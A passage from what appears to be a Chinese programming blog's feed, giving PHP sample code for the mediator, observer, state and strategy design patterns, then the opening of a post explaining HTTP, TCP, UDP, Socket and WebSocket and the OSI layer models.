class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$id</span>,Colleague <span class="variable">$colleague</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMediator</span> <span class="keyword">extends</span> <span class="title">Mediator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$colleagues</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$colleagues</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$colleagues</span> = [];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">opreation</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$id</span>,<span class="built_in">self</span>::<span class="variable">$colleagues</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;colleague not found&quot;</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$colleague</span> = <span class="built_in">self</span>::<span class="variable">$colleagues</span>[<span class="variable">$id</span>];</span><br><span class="line">      <span class="variable">$colleague</span>-&gt;<span class="title function_ invoke__">receiveMsg</span>(<span class="variable">$message</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$id</span>,Colleague <span class="variable">$colleague</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$colleague</span>, <span class="built_in">self</span>::<span class="variable">$colleagues</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$colleagues</span>[<span class="variable">$id</span>] = <span class="variable">$colleague</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$colleague</span>-&gt;<span class="title function_ invoke__">setMediator</span>(<span class="variable">$this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$colleagueA</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ColleagueA</span>();</span><br><span class="line"><span class="variable">$colleagueB</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ColleagueB</span>();</span><br><span class="line"><span class="variable">$mediator</span> = <span class="keyword">new</span> <span class="title class_">MyMediator</span>();</span><br><span class="line"><span class="variable">$mediator</span>-&gt;<span class="title function_ invoke__">register</span>(<span class="number">1</span>,<span class="variable">$colleagueA</span>);</span><br><span class="line"><span class="variable">$mediator</span>-&gt;<span class="title function_ invoke__">register</span>(<span class="number">2</span>,<span class="variable">$colleagueB</span>);</span><br><span class="line"><span class="variable">$colleagueA</span>-&gt;<span class="title function_ invoke__">sendMsg</span>(<span class="number">2</span>,<span class="string">&#x27;hello admin&#x27;</span>);</span><br><span class="line"><span class="variable">$colleagueB</span>-&gt;<span class="title function_ invoke__">sendMsg</span>(<span class="number">1</span>,<span class="string">&#x27;shiyanlou&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>中介者模式的两个主要作用：中转作用（结构性）：通过中介者提供的中转作用，各个同事对象就不再需要显式引用其他同事，当需要和其他同事进行通信时，通过中介者即可。该中转作用属于中介者在结构上的支持。</p>
<p>协调作用（行为性）：中介者可以更进一步的对同事之间的关系进行封装，同事可以一致地和中介者进行交互，而不需要指明中介者需要具体怎么做，中介者根据封装在自身内部的协调逻辑，对同事的请求进行进一步处理，将同事成员之间的关系行为进行分离和封装。该协调作用属于中介者在行为上的支持。</p>
<h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h2><p>在此种模式中，一个目标对象管理所有相依于它的观察者对象，并且在它本身的状态改变时主动发出通知。这通常透过呼叫各观察者所提供的方法来实现。此种模式通常被用来实时事件处理系统。观察者模式又叫做发布 - 订阅（Publish&#x2F;Subscribe）模式、模型 - 视图（Model&#x2F;View）模式、源 - 监听器（Source&#x2F;Listener）模式或从属者（Dependents）模式。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Subject:</span> 抽象目标类，一般至少提供三个接口：</span><br><span class="line"></span><br><span class="line">    添附 (Attach)：新增观察者到串炼内，以追踪目标对象的变化。</span><br><span class="line">    解附 (Detach)：将已经存在的观察者从串炼中移除。</span><br><span class="line">    通知 (Notify)：利用观察者所提供的更新函式来通知此目标已经产生变化。</span><br><span class="line"><span class="symbol">ConcreteSubject:</span> 具体目标，提供了观察者欲追踪的状态，也可设置目标状态</span><br><span class="line"></span><br><span class="line"><span class="symbol">Observer:</span> 抽象观察者，定义观察者的更新操作接口</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteObserver:</span> 具体观察者，实现抽象观察者的接口，做出自己的更新操作</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Obeserver</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Subject <span class="variable">$sub</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$obeservers</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$obeservers</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$obeservers</span> = [];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">attach</span>(<span class="params">Obeserver <span class="variable">$obeserver</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$obeserver</span>, <span class="built_in">self</span>::<span class="variable">$obeservers</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$obeservers</span>[] = <span class="variable">$obeserver</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deattach</span>(<span class="params">Obeserver <span class="variable">$obeserver</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$obeserver</span>, <span class="built_in">self</span>::<span class="variable">$obeservers</span>)) &#123;</span><br><span class="line">          <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="variable">$obeserver</span>,<span class="built_in">self</span>::<span class="variable">$obeservers</span>);</span><br><span class="line">          <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$obeservers</span>[<span class="variable">$key</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params"><span class="variable">$state</span></span>)</span>;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getState</span>(<span class="params"></span>)</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">notify</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="built_in">self</span>::<span class="variable">$obeservers</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">          <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySubject</span> <span class="keyword">extends</span> <span class="title">Subject</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$state</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setState</span>(<span class="params"><span class="variable">$state</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;state = <span class="variable">$state</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getState</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObeserver</span> <span class="keyword">extends</span> <span class="title">Obeserver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obeserverName</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;obeserverName = <span class="variable">$name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">Subject <span class="variable">$sub</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$state</span> = <span class="variable">$sub</span>-&gt;<span class="title function_ invoke__">getState</span>();</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Update Obeserver[&quot;</span>.<span class="variable language_">$this</span>-&gt;obeserverName.<span class="string">&#x27;] State: &#x27;</span>.<span class="variable">$state</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="keyword">new</span> <span class="title class_">MySubject</span>();</span><br><span class="line"><span class="variable">$one</span> = <span class="keyword">new</span> <span class="title class_">MyObeserver</span>(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line"><span class="variable">$two</span> = <span class="keyword">new</span> <span class="title class_">MyObeserver</span>(<span class="string">&#x27;two&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">attach</span>(<span class="variable">$one</span>);</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">attach</span>(<span class="variable">$two</span>);</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">setState</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">notify</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;--------------------- &lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">setState</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">deattach</span>(<span class="variable">$two</span>);</span><br><span class="line"><span class="variable">$subject</span>-&gt;<span class="title function_ invoke__">notify</span>();</span><br></pre></td></tr></table></figure>

<p>主要作用：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">当抽象个体有两个互相依赖的层面时。封装这些层面在单独的对象内将可允许程序员单独地去变更与重复使用这些对象，而不会产生两者之间交互的问题。</span><br><span class="line">当其中一个对象的变更会影响其他对象，却又不知道多少对象必须被同时变更时。</span><br><span class="line">当对象应该有能力通知其他对象，又不应该知道其他对象的实做细节时。</span><br></pre></td></tr></table></figure>

<h2 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h2><p>状态模式：允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。其别名为状态对象 (Objects for States)，状态模式是一种对象行为型模式。</p>
<p>有时，一个对象的行为受其一个或多个具体的属性变化而变化，这样的属性也叫作状态，这样的的对象也叫作有状态的对象。</p>
<p>角色</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Context:</span> 环境类，维护一个 ConcreteState 子类的实例，这个实例定义当前状态；</span><br><span class="line"></span><br><span class="line"><span class="symbol">State:</span> 抽象状态类，定义一个接口以封装与 Context 的一个特定状态相关的行为；</span><br><span class="line"></span><br><span class="line"><span class="symbol">ConcreteState:</span> 具体状态类，每一个子类实现一个与 Context 的一个状态相关的行为。</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Context</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$state</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;state = StateA::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">changeState</span>(<span class="params">State <span class="variable">$state</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;state = <span class="variable">$state</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;state-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">State</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Context <span class="variable">$context</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateA</span> <span class="keyword">extends</span> <span class="title">State</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$instance</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Context <span class="variable">$context</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;doing something in State A.\n done,change state to B &lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$context</span>-&gt;<span class="title function_ invoke__">changeState</span>(StateB::<span class="title function_ invoke__">getInstance</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateB</span> <span class="keyword">extends</span> <span class="title">State</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$instance</span>)) &#123;</span><br><span class="line">          <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Context <span class="variable">$context</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;doing something in State B.\n done,change state to A &lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$context</span>-&gt;<span class="title function_ invoke__">changeState</span>(StateA::<span class="title function_ invoke__">getInstance</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="title class_">Context</span>();</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">request</span>();</span><br></pre></td></tr></table></figure>

<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><p>策略模式 (Strategy Pattern)：定义一系列算法，将每一个算法封装起来，并让它们可以相互替换。策略模式让算法独立于使用它的客户而变化，也称为政策模式 (Policy)。</p>
<p>常见示例：常见的排序算法有快速排序，冒泡排序，归并排序，选择排序等，如果我们需要在一个算法类中提供这些算法，一个常见的解决方法就是在类中定义多个方法，每个方法定义一种具体的排序算法，然后使用 if…else… 去判断到底是哪种算法，或者直接调用某个具体方法。这种方法是将算法的实现硬编码到类中，这样做最大的弊端就是算法类类非常臃肿，而且当需要增加或者更换一种新的排序方法时候，需要修改算法类的代码，同时也需要修改客户端调用处的代码。策略模式就是为了解决这列问题而设计的。</p>
<p>角色</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Context</span>: 环境类，使用一个 ConcreteStrategy 对象来配置；维护一个对 Stategy 对象的引用，同时，可以定义一个接口来让 Stategy 访问它的数据。</span><br><span class="line"></span><br><span class="line"><span class="keyword">Strategy</span>: 抽象策略类，定义所有支持的算法的公共接口。<span class="keyword">Context</span> 使用这个接口来调用某 ConcreteStrategy 定义的算法；</span><br><span class="line"></span><br><span class="line">ConcreteStrategy: 具体策略类，实现 <span class="keyword">Strategy</span> 接口的具体算法；</span><br></pre></td></tr></table></figure>

<p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Strategy</span></span>&#123;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="keyword">use</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StrategyA</span> <span class="keyword">extends</span> <span class="title">Strategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="keyword">use</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是使用策略A的方法 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StrategyB</span> <span class="keyword">extends</span> <span class="title">Strategy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="keyword">use</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这是使用策略B的方法 &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Context</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$startegy</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setStrategy</span>(<span class="params">Strategy <span class="variable">$startegy</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;startegy = <span class="variable">$startegy</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="keyword">use</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;startegy-&gt;<span class="keyword">use</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="title class_">Context</span>();</span><br><span class="line"><span class="variable">$startegyA</span> = <span class="keyword">new</span> <span class="title function_ invoke__">StrategyA</span>();</span><br><span class="line"><span class="variable">$startegyB</span> = <span class="keyword">new</span> <span class="title function_ invoke__">StrategyB</span>();</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">setStrategy</span>(<span class="variable">$startegyA</span>);</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="keyword">use</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="title function_ invoke__">setStrategy</span>(<span class="variable">$startegyB</span>);</span><br><span class="line"><span class="variable">$context</span>-&gt;<span class="keyword">use</span>();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>DataStructure</category>
      </categories>
  </entry>
  <entry>
    <title>理解 HTTP，TCP，UDP，Socket，WebSocket</title>
    <url>/2017/12/http_protocol/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>谨以此文总结我站在iOS开发者角度对于以上关键词的形象理解，至于底层抽象的概念，别人用啥TCP&#x2F;IP详解：卷一、卷二、卷三都讲不清楚，我也懒得浪费时间。</p>
<p>前人栽树，后人乘凉，一个道理。</p>
<span id="more"></span>

<h3 id="一、这一大堆关键词之间到底有啥区别？"><a href="#一、这一大堆关键词之间到底有啥区别？" class="headerlink" title="一、这一大堆关键词之间到底有啥区别？"></a>一、这一大堆关键词之间到底有啥区别？</h3><p>有名字就有定义，理解的前提从来都是对定义有所了解。就好比现在让你形容一下梯形的定义，如果你不知道定义，你就可能把平行四边形当做特殊的梯形处理，也就有可能把TCP和Socket搞混，更加会纠结TCP连接与Socket连接以及HTTP的长&#x2F;短连接之间到底有啥区别。</p>
<p>其实有了区别才好理解。但在这之前首先得理清一个概念，那就是OSI七层模型，以及所谓的五层模型，四层模型到底是什么鬼？</p>
<blockquote>
<p>OSI七层模型是万能的国际标准化组织(ISO)提出的一个试图使各种计算机在世界范围内互连的理想标准，说白了理想和现实的差距就是七层模型和五层模型的差距。具体分类如下表：</p>
</blockquote>
<table>
<thead>
<tr>
<th>七层模型</th>
<th>五层模型</th>
<th>四层模型</th>
</tr>
</thead>
<tbody><tr>
<td>应用层</td>
<td></td>
<td></td>
</tr>
<tr>
<td>表示层</td>
<td>应用层</td>
<td>应用层</td>
</tr>
<tr>
<td>会话层</td>
<td></td>
<td></td>
</tr>
<tr>
<td>传输层</td>
<td>传输层</td>
<td>传输层</td>
</tr>
<tr>
<td>网络层</td>
<td>网络层</td>
<td>网络层</td>
</tr>
<tr>
<td>数据链路层</td>
<td>数据链路层</td>
<td>链接层&#x2F;实体层</td>
</tr>
<tr>
<td>物理层</td>
<td>物理层</td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>七层模型的上三层归为应用层即为TCP&#x2F;IP五层模型，五层模型的下两层归为链接层或者说实体层即为四层模型。<br>也就是说，所谓的五层或者四层，其实可以认为是方便理解而形成的潜规则，而具体的实施肯定还是得根据七层的标准来。毕竟每一层都有每一层各自的功能，而为了完成每一层的功能，就需要大家遵守相关的规则，也就是协议。所以，对模型分层没必要太在意，五层也好，四层也罢，对于这些看不见摸不着的东西，你只要知道，互联网是分层的，来来去去加起来也就这么几层就够了。</p>
</blockquote>
<p><strong>那么，回到第一个问题，这一大堆关键词之间到底有啥区别？</strong></p>
<ul>
<li><p>从本质上来区分，HTTP，WebSocket，TCP，UDP，IP都是协议，而TCP&#x2F;IP是不同协议的组合，你也可以称之为协议栈，协议族，TCP&#x2F;IP模型等等都可以，你开心就行，反正都是虚无的不能吃的东西，都是为了完成对应功能而制定的统一规则。<br>而Socket（套接字）才是真正能操作的东西。Socket的本质是API，是先人对TCP&#x2F;IP协议族的抽象或者说封装，它就像一个门面，给你一个操作TCP&#x2F;IP协议的入口，来建立Socket连接。值得一提的是，此Socket是指网络编程下的Socket，而不是Unix中的Socket。虽然概念相似，但是Unix中的Socket不是基于这些乱七八糟的协议，而是基于操作系统本身的文件系统。</p>
</li>
<li><p>从分层上来区分，HTTP，WebSocket是应用层协议，TCP，UDP是传输层协议，IP是网络层协议。</p>
</li>
</ul>
<h3 id="二、这些关键词之间具体有什么联系？"><a href="#二、这些关键词之间具体有什么联系？" class="headerlink" title="二、这些关键词之间具体有什么联系？"></a>二、这些关键词之间具体有什么联系？</h3><h4 id="1-TCP和UDP"><a href="#1-TCP和UDP" class="headerlink" title="1.TCP和UDP"></a>1.TCP和UDP</h4><blockquote>
<p>TCP是面向连接的一种传输控制协议。TCP连接之后，客户端和服务器可以互相发送和接收消息，在客户端或者服务器没有主动断开之前，连接一直存在，故称为长连接。特点：连接有耗时，传输数据无大小限制，准确可靠，先发先至。<br>UDP是无连接的用户数据报协议，所谓的无连接就是在传输数据之前不需要交换信息，没有握手建立连接的过程，只需要直接将对应的数据发送到指定的地址和端口就行。故UDP的特点是不稳定，速度快，可广播，一般数据包限定64KB之内，先发未必先至。</p>
</blockquote>
<h4 id="2-HTTP"><a href="#2-HTTP" class="headerlink" title="2.HTTP"></a>2.HTTP</h4><blockquote>
<p>HTTP是基于TCP协议的应用，请求时需建立TCP连接，而且请求包中需要包含请求方法，URI，协议版本等信息，请求结束后断开连接，完成一次请求&#x2F;响应操作。故称为短连接。<br>而HTTP&#x2F;1.1中的keep-alive所保持的长连接则是为了优化每次HTTP请求中TCP连接三次握手的麻烦和资源开销，只建立一次TCP连接，多次的在这个通道上完成请求&#x2F;响应操作。<br>值得一提的是，服务器无法主动给客户端推送消息。</p>
</blockquote>
<h4 id="3-WebSocket"><a href="#3-WebSocket" class="headerlink" title="3.WebSocket"></a>3.WebSocket</h4><blockquote>
<p>WebSocket也是一种协议，并且也是基于TCP协议的。具体流程是WebSocket通过HTTP先发送一个标记了 Upgrade 的请求，服务端解析后开始建立TCP连接，省去了HTTP长连接每次请求都要上传header的冗余，可以理解为WebSocket是HTTP的优化，但WebSocket不仅仅在Web应用程序上得到支持。</p>
</blockquote>
<h4 id="4-Socket连接和TCP连接"><a href="#4-Socket连接和TCP连接" class="headerlink" title="4.Socket连接和TCP连接"></a>4.Socket连接和TCP连接</h4><blockquote>
<p>其实这就是一个文字游戏而已，建立Socket连接需要至少一对Socket（套接字），而创建Socket连接可以指定不同的传输层协议，即TCP或UDP，所以当采用TCP建立连接时，该Socket连接就视为一个TCP连接。而采用UDP则是无连接的。</p>
</blockquote>
